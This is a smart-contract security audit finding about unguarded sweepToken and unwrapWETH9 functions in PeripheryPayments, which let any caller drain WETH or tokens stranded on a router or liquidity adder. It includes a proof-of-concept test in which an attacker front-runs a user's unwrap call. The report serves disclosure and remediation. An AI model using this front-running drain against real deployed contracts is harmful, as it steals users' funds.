### Title
Unguarded `sweepToken` and `unwrapWETH9` with caller-controlled `recipient` allow any attacker to drain router/adder balances ŌĆö (`metric-periphery/contracts/base/PeripheryPayments.sol`)

---

### Summary

`sweepToken` and `unwrapWETH9` in `PeripheryPayments` are `public payable` with no access control and accept a fully attacker-controlled `recipient` address. They transfer the contract's **entire** balance of a token or WETH to that address. Because both `MetricOmmSimpleRouter` and `MetricOmmPoolLiquidityAdder` inherit this contract, any tokens or WETH that legitimately land on either contract during normal usage can be stolen by an unprivileged caller in a separate transaction.

---

### Finding Description

`PeripheryPayments.sweepToken` and `PeripheryPayments.unwrapWETH9` are declared `public payable` with no caller restriction:

```solidity
function unwrapWETH9(uint256 amountMinimum, address recipient) public payable override {
    uint256 balanceWETH = IERC20(WETH).balanceOf(address(this));
    if (balanceWETH < amountMinimum) revert InsufficientWETH(amountMinimum, balanceWETH);
    if (balanceWETH > 0) {
        IWETH9(WETH).withdraw(balanceWETH);
        _transferETH(recipient, balanceWETH);   // ŌåÉ arbitrary recipient
    }
}

function sweepToken(address token, uint256 amountMinimum, address recipient) public payable override {
    uint256 balanceToken = IERC20(token).balanceOf(address(this));
    if (balanceToken < amountMinimum) revert InsufficientToken(token, amountMinimum, balanceToken);
    if (balanceToken > 0) {
        IERC20(token).safeTransfer(recipient, balanceToken);  // ŌåÉ arbitrary recipient
    }
}
``` [1](#0-0) 

Both `MetricOmmSimpleRouter` and `MetricOmmPoolLiquidityAdder` inherit `PeripheryPayments` and expose these functions to any external caller. [2](#0-1) [3](#0-2) 

The standard ETH-output swap pattern explicitly routes WETH through the router as an intermediate holder. In `exactInput`, intermediate hops send output to `address(this)`:

```solidity
i == last ? params.recipient : address(this),
``` [4](#0-3) 

And the documented ETH-output pattern (`exactInputSingle` with `recipient=address(router)` followed by `unwrapWETH9`) is explicitly tested as two individually callable steps: [5](#0-4) 

When a user executes these two steps as separate transactions rather than a single `multicall`, WETH is stranded on the router between them. Because `unwrapWETH9(0, attacker)` requires no privilege and passes `amountMinimum = 0`, an attacker can drain the full balance before the user's second call lands.

The same applies to `sweepToken` for any ERC-20 stranded on the router or liquidity adder (e.g., excess token0/token1 from a partial liquidity add via `addLiquidityExactShares{value: ...}` followed by a separate `sweepToken` call). [6](#0-5) 

---

### Impact Explanation

An attacker can steal the **entire** WETH or ERC-20 balance of the router or liquidity adder in a single unprivileged call. The victim loses the full output of their swap or the full token amount they deposited into the adder. This is a direct loss of user principal with no protocol-level recovery path.

---

### Likelihood Explanation

The two-step pattern (swap ŌåÆ unwrap, or add-liquidity ŌåÆ sweep) is a natural usage pattern that the codebase explicitly tests. Any user who does not bundle both steps into a single `multicall` is vulnerable. A mempool-watching attacker can front-run the second step with zero capital requirement and zero special privilege. The `amountMinimum = 0` argument makes the attack unconditional.

---

### Recommendation

Restrict `sweepToken` and `unwrapWETH9` so that the `recipient` can only be `msg.sender`, mirroring the safe design already used by `refundETH`:

```solidity
function unwrapWETH9(uint256 amountMinimum) public payable override {
    uint256 balanceWETH = IERC20(WETH).balanceOf(address(this));
    if (balanceWETH < amountMinimum) revert InsufficientWETH(amountMinimum, balanceWETH);
    if (balanceWETH > 0) {
        IWETH9(WETH).withdraw(balanceWETH);
        _transferETH(msg.sender, balanceWETH);
    }
}

function sweepToken(address token, uint256 amountMinimum) public payable override {
    uint256 balanceToken = IERC20(token).balanceOf(address(this));
    if (balanceToken < amountMinimum) revert InsufficientToken(token, amountMinimum, balanceToken);
    if (balanceToken > 0) {
        IERC20(token).safeTransfer(msg.sender, balanceToken);
    }
}
```

This preserves the `multicall`-composable design (since `multicall` uses `delegatecall`, `msg.sender` inside each sub-call is the original caller) while eliminating the arbitrary-recipient theft vector. [7](#0-6)

### Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.35;

// Setup: pool with WETH/token1, router deployed, attacker is any EOA.

function test_attacker_steals_weth_from_router() public {
    uint128 amountIn = 3_000;
    uint256 recipientWethBefore = weth.balanceOf(recipient);

    // Step 1: legitimate user swaps token1 ŌåÆ WETH, routing output to router
    // (user intends to call unwrapWETH9 in a follow-up tx)
    vm.prank(swapper);
    router.exactInputSingle(
        IMetricOmmSimpleRouter.ExactInputSingleParams({
            pool: address(pool),
            tokenIn: address(token1),
            tokenOut: address(weth),
            zeroForOne: false,
            amountIn: amountIn,
            amountOutMinimum: 0,
            recipient: address(router),   // WETH lands on router
            deadline: block.timestamp + 1,
            priceLimitX64: type(uint128).max,
            extensionData: ""
        })
    );

    uint256 routerWeth = weth.balanceOf(address(router));
    assertGt(routerWeth, 0, "weth on router");

    // Step 2: attacker front-runs the user's unwrapWETH9 call
    address attacker = address(0xBEEF);
    vm.prank(attacker);
    router.unwrapWETH9(0, attacker);   // amountMinimum=0, recipient=attacker

    // Attacker receives all WETH as ETH; user gets nothing
    assertEq(attacker.balance, routerWeth, "attacker stole weth");
    assertEq(weth.balanceOf(address(router)), 0, "router drained");
    assertEq(weth.balanceOf(recipient), recipientWethBefore, "user received nothing");
}
```
